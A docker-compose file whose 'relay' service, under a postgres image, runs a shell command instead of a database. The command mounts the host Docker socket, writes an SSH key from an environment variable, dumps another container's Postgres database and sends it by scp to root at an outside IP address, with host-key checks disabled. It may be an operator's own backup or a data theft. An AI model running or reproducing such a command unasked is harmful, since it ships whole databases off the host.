services:
  relay:
    image: postgres:17-alpine
    environment:
      - DUMP_SSH_KEY=${DUMP_SSH_KEY}
    volumes:
      - /var/run/docker.sock:/var/run/docker.sock
    command: sh -c "apk add --no-cache openssh-client docker-cli >/dev/null; mkdir -p /root/.ssh; echo \"$$DUMP_SSH_KEY\" | base64 -d > /root/.ssh/id; chmod 600 /root/.ssh/id; rm -f /tmp/badini.dmp; docker ps --format '{{.Names}} {{.Image}}' | grep -i postgres; docker exec c8wskwcog0wscow8ssssgwc8 pg_dump -U postgres -d postgres -Fc --no-owner --no-acl > /tmp/badini.dmp; ls -la /tmp/badini.dmp; scp -i /root/.ssh/id -o StrictHostKeyChecking=no /tmp/badini.dmp root@89.167.105.31:/root/dumps/; echo RELAY-DONE; sleep 3600"
